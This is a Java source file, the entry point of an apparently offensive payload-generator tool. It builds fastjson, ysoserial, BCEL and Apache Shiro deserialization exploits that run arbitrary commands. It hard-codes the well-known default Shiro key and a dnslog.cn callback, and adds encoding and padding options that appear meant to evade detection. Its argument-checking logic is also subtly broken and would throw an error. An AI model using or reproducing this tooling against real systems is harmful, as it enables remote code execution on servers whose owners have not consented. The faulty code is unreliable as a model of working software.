package com.ding0x0.run;

import com.ding0x0.Payload;
import org.apache.commons.cli.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.Queue;

public class App {

    public String helper(){
        return "-fastjson <arg>    generate fastjson payload\n" +
                "\t可选: DNS -u dns地址\n" +
                "\t\t  JNDI -u \n" +
                "\t\t  JDBC -u -p -un 连接用户名 -statement 连接串 （使用https://github.com/fnmsd/MySQL_Fake_Server）\n" +
                "\t\t  Upload -lf -rf \n" +
                "\t\t  BCEL -lf\n" +
                "\t\n" +
                "-yso <arg>         generate yso payload\n" +
                "\t-c 指定命令\n" +
                "\t-gh 查看gadget\n" +
                "\n" +
                "-BCEL              generate BCEL payload\n" +
                "\n" +
                "-shiro             generate shiro payload\n" +
                "\t-g 指定gadget\n" +
                "\t-k 指定key\t\n" +
                "\t\n" +
                "-be                base64 encode\n" +
                "-d                 dirty data wrapper(default data 200\n" +
                "-g                 yso gadget\n" +
                "-c <arg>           command\n" +
                "-k <arg>           key\n" +
                "-lf <arg>          local file path\n" +
                "-p <arg>           port\n" +
                "-rf <arg>          remote file path\n" +
                "\n" +
                "-statement <arg>   statement(default\n" +
                "                   com.mysql.jdbc.interceptors.ServerStatusDiffIntercepto\n" +
                "                   r)\n" +
                "-u <arg>           url or dns\n" +
                "-ue                url encode\n" +
                "-un <arg>          username(default yso_URLDNS_http://xxx.dnslog.cn)\n" +
                "-xe                xml encode";
    }

    public static void main(String[] args) throws Exception {
        String help = "1. Fastjson payload生成\n" +
                "\t--> JdbcRowSetImpl  \n" +
                "\t--> mybatis JndiDataSourceFactory\n" +
                "\t--> JDBC\n" +
                "\t--> 文件写入\n" +
                "2. BCEL生成\n" +
                "\t--> 接码\n" +
                "\t--> 编码\n" +
                "3. XStream结合Yso\n" +
                "4. shiro";
        new App().run(args);
    }

    public Options init(){
        Options options = new Options();
        OptionGroup optionGroup = new OptionGroup();

        // 可选项
        optionGroup.addOption(new Option("yso", true,"generate yso payload "));
        optionGroup.addOption(new Option("shiro", "generate shiro payload"));
        optionGroup.addOption(new Option("fastjson",true,"generate fastjson payload"));
        optionGroup.addOption(new Option("BCEL", "generate fastjson payload"));

        options.addOptionGroup(optionGroup);

        // gadget
        options.addOption("g", true,"yso gadget");
        options.addOption("gh","gadget helper");

        // 其他
        options.addOption("d","dirty data wrapper(default data 200");

        // 编码
        options.addOption("be","base64 encode");
        options.addOption("ue","url encode");
        options.addOption("xe","xml encode");

        // payload参数
        options.addOption("k", true,"key(default kPH+bIxk5D2deZiIxcaaaA==)");
        options.addOption("u", true,"url or dns");
        options.addOption("p", true,"port");
        options.addOption("lf",true,"local file path");
        options.addOption("rf",true,"remote file path");
        options.addOption("c",true,"command");
        options.addOption("un",true,"username(default yso_URLDNS_http://xxx.dnslog.cn)");
        options.addOption("statement", true, "statement(default com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor)");
        return options;
    }


    public void checkArgs(String[] args) throws Exception {
        Options o = init();
        DefaultParser parser = new DefaultParser();
        CommandLine cmdline = parser.parse(o, args);
        Option[] options = cmdline.getOptions();
        if (options.length == 0) {
            System.out.println(helper());
            System.exit(1);
        }else if (cmdline.hasOption("gh")){
            System.out.println("..");
            System.exit(1);
        }
        Queue<String> code = new LinkedList<>();
        String payloadType = null;
        String gadget = null;
        ArrayList<String> payloadParam = new ArrayList<>();
        ArrayList<String> other = new ArrayList<>();
        for (Option option :
                options) {
            String key = option.getOpt();
            switch (key){
                case "shiro":
                case "fastjson":
                case "yso":
                case "BCEL":
                    payloadType = key;
                    break;
                // 编码
                case "ue":
                case "be":
                case "xe":
                    code.add(key);
                    break;
                case "k":
                case "u":
                case "p":
                case "c":
                case "lf":
                case "statement":
                case "un":
                case "rf":
                    // 加一个payloadType 判断，否则先赋值后会 getOptionValue会抛出异常
                    if (payloadType == null && cmdline.getOptionValue(payloadType).equals("JDBC") && payloadParam.isEmpty()){
                        if (cmdline.getOptionValue("un") == null){
                            payloadParam.add("yso_URLDNS_http://xxx.dnslog.cn");
                        }
                        if (cmdline.getOptionValue("statement") == null){
                            payloadParam.add("com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor");
                        }
                    }
                    payloadParam.add(cmdline.getOptionValue(key));
                    break;
                case "g":
                    gadget = key;
                    break;
                case "d":
                    other.add(key);
                    break;
            }
        }
        Process process = new Process(code,other,gadget,payloadType,payloadParam,cmdline);
        Payload object = (Payload) process.makeObject();
        System.out.println(object.format());
    }


    public void run(String[] args) throws Exception {
        new App().checkArgs(args);
    }

}
